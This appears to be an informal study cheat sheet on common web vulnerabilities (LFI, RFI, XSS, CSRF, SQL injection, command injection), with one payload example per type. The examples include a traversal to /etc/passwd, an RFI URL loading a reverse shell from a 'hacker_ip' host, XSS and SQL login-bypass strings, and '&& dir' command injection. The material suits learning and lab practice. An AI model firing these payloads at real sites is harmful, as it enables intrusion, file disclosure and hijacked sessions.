- Mostly known stuff. slightly outdated

Only cool stuff written below 😎

# Common web vulns simplified

# Local file Inclusion,LFI
- file included in the vulnerable webservers directory
Normally
`http://domain_name//index.php?file=hack.html`

hacked 😎
`http://domain_name//index.php?file=../../../../etc/passwd`


# Remote File Inclusion, RFI
- load a file from a remote server (ie the attackers server)
Normally
`http://domain_name//index.php?file=hack.html`

hacked 😎
`http://domain_name//index.php?file=http://hacker_ip/reverseshell.php`

Note: Can be any service eg smb:// ftp:// etc so if http is blocked theres others
eg `http://school.flight.htb/index.php?view=//myipaddress/test` --> used in htb flight(hard)


# Cross site scripting, XSS
- happens usually if some element on the page changes dynamically to user input
- Eg: blog posts, timers, Tables etc

### Reflected XSS
- input is reflected on the users side
placing `<script>alert('hacked')</script>` in the input field somewhere
hacked 😎

### Stored XSS
- the stored kind like blogs,posts
uploading `<script>alert('hacked')</script>` as a posts or something
hacked 😎

- can also be done to header fields
- intercept using burp proxy
- change the header required to `<script>alert('hacked')</script>`
example given has site showing the browser agents of posts sent to it
So, change the User-Agent: `<script>alert('hacked')</script>`
hacked 😎


### DOM XSS
- Document object Model version of xss
- change scripts being run on the webpage itself (F12 or view source)
- the original script tries to pull data from the server
Example given:
Some site to create a password for user gus



Original script
```html
<script>
try {document.getElementById("idUsernameInput").innerHTML = " This pw is for gus";}
catch(e) {alert"Error: " + e.message; }
//end catch
</script>
```

Hacked script made to look legit 
```html
<script>
try {document.getElementById("idUsernameInput").innerHTML = " This pw is for  c
catch(e){};
alert("hacked"); 
try {v="";}
catch(e){alert"Error: " + e.message; }
//end catch
</script>
```

Part added replacing gus with the code  (sort of like a sqli) 
`";}catch(e){};alert("hacked");try {v="`
-> Send this to a encoder then encode as URL
-> burp suite Decoder, Encode as URL
Looks like below
`%22%3b%.........%3d%22`

Send payload in the url
original url: `http://smt/index.php?page=password-generator.php&username=gus`
hacked urlurl: `http://smt/index.php?page=password-generator.php&username=%22%3b%.........%3d%22`  😎


### Javascript input blocked on client side?? Cant type it directly in input box???
- worry no more
- burp proxy, edit the input, send it


# Cross-Site Request Forgery, CSRF 

- Takes advantage of trust given to an existing user session (eg cookies after logging in)
- This trust can pesist bewteen pages (so page 1 legit login, page 2 maliious page and press button that gives attacker the cookie )


- Could be to execute code on the server with elevated access or for attacker to gain a backdoor in to that users session
- different from XSS cos it relied on victims session! **(aka session riding)**

XSS you execute the js code and create a session etc. 
CSRF you use the victims session (and execute code if u want)


# SQLi
1. Query database for user data
2. Bypass login
3. Execute system commands
4. Manipulate data stored to gain access

## Auth bypass
Eg
select * from users where username ='admin' or 1=1 -- and password = ''
username: admin' or 1=1 --
password: 
hacked 😎

## Data Extraction
somehow get below into an input field
select * from users
hacked 😎

## Blind SQL
- cant see the output but same as before

## Command injection
Eg Site that searches ip for domain
- Guess that its using:
`nslookup <ip>`
where  `<ip>`  is taken from the input field

So,
In the input field put `<ip> && dir`
overall code executed on server
`nslookup <ip> && dir`
hacked 😎

